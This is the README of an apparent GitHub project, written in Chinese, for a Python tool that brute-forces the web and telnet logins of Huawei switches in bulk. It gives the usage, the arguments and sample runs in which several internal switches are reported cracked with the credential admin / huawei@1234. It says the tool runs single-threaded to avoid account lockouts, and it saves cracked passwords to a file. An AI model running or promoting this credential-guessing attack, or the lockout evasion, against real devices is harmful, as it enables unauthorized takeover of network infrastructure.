# huaweiSwitchCrack
华为交换机（WEB登录页面）批量爆破脚本

【别问为啥单线程，多线程会导致锁账号15分钟！

# 截图
启动截图
![Start](https://github.com/NS-Sp4ce/huaweiSwitchCrack/blob/master/img/start.png)
运行过程中
![processing](https://github.com/NS-Sp4ce/huaweiSwitchCrack/blob/master/img/processing.png)
爆破成功的交换机密码会保存在当前目录中的success.txt
# 使用说明
## 需要
 - Python3
 - requests

如果报错类似于
```
requests.exceptions.SSLError: HTTPSConnectionPool(host='10.50.100.35', port=443): Max retries exceeded with url: / (Caused by SSLError(SSLError(1, '[SSL: SSLV3_ALERT_ILLEGAL_PARAMETER] sslv3 alert illegal parameter (_ssl.c:1076)')))
```
尝试卸载`pyopenssl`再试试
```
python3 -m pip uninstall pyopenssl
```

```
λ python3 huaweiSwitchCrack.py

  _    _                          _    _____         _ _       _        _____                _
 | |  | |                        (_)  / ____|       (_) |     | |      / ____|              | |
 | |__| |_   _  __ ___      _____ _  | (_____      ___| |_ ___| |__   | |     _ __ __ _  ___| | __
 |  __  | | | |/ _` \ \ /\ / / _ \ |  \___ \ \ /\ / / | __/ __| '_ \  | |    | '__/ _` |/ __| |/ /
 | |  | | |_| | (_| |\ V  V /  __/ |  ____) \ V  V /| | || (__| | | | | |____| | | (_| | (__|   <
 |_|  |_|\__,_|\__,_| \_/\_/ \___|_| |_____/ \_/\_/ |_|\__\___|_| |_|  \_____|_|  \__,_|\___|_|\_\

                                        By:Sp4ce

usage: huaweiSwitchCrack.py [-h] [-target TARGETFILE]
                            [-unamefile USERNAMEFILE] [-pwdfile PASSWORDFILE]

optional arguments:
  -h, --help            show this help message and exit
  -target TARGETFILE, --targetfile TARGETFILE
                        Load targets file or single target.
  -unamefile USERNAMEFILE, --usernamefile USERNAMEFILE
                        Use custom username file, if param is none, use
                        default username list.
  -pwdfile PASSWORDFILE, --passwordfile PASSWORDFILE
                        Use custom password file, if param is none, use
                        default password list.
```
### E.g:
```
λ python3 huaweiSwitchCrack.py -target urls.txt -unamefile uname.txt -pwdfile pass.txt

  _    _                          _    _____         _ _       _        _____                _
 | |  | |                        (_)  / ____|       (_) |     | |      / ____|              | |
 | |__| |_   _  __ ___      _____ _  | (_____      ___| |_ ___| |__   | |     _ __ __ _  ___| | __
 |  __  | | | |/ _` \ \ /\ / / _ \ |  \___ \ \ /\ / / | __/ __| '_ \  | |    | '__/ _` |/ __| |/ /
 | |  | | |_| | (_| |\ V  V /  __/ |  ____) \ V  V /| | || (__| | | | | |____| | | (_| | (__|   <
 |_|  |_|\__,_|\__,_| \_/\_/ \___|_| |_____/ \_/\_/ |_|\__\___|_| |_|  \_____|_|  \__,_|\___|_|\_\

                                        By:Sp4ce

[i] Load 2 Username(s) and 11 Password(s) For Test 5 Target(s).
[i] Check https://10.50.100.35 is alive.
[+] Target https://10.50.100.35 is alive.
[i] Testing admin Huawei@1234 for target https://10.50.100.35/login.cgi
[i] Testing admin huawei@1234 for target https://10.50.100.35/login.cgi
[+] Cracked https://10.50.100.35/login.cgi Success， Username=> admin  Password=> huawei@1234
[i] Check https://10.50.100.34 is alive.
[-] Target https://10.50.100.34 is dead.
[i] Check https://10.50.100.33 is alive.
[+] Target https://10.50.100.33 is alive.
[i] Testing admin Huawei@1234 for target https://10.50.100.33/login.cgi
[i] Testing admin huawei@1234 for target https://10.50.100.33/login.cgi
[+] Cracked https://10.50.100.33/login.cgi Success， Username=> admin  Password=> huawei@1234
[i] Check https://10.50.100.36 is alive.
[+] Target https://10.50.100.36 is alive.
[i] Testing admin Huawei@1234 for target https://10.50.100.36/login.cgi
[i] Testing admin huawei@1234 for target https://10.50.100.36/login.cgi
[+] Cracked https://10.50.100.36/login.cgi Success， Username=> admin  Password=> huawei@1234
[i] Check https://10.50.100.37 is alive.
[+] Target https://10.50.100.37 is alive.
[i] Testing admin Huawei@1234 for target https://10.50.100.37/login.cgi
[i] Testing admin huawei@1234 for target https://10.50.100.37/login.cgi
[+] Cracked https://10.50.100.37/login.cgi Success， Username=> admin  Password=> huawei@1234
[i] All Test Was Down.
```

# Changelog

## 2019年10月30日

- 新增`telnet`批量检测功能（`Usage:python3 huaweiSwitchCrack.py -target 10.50.100.35 -method telnet`）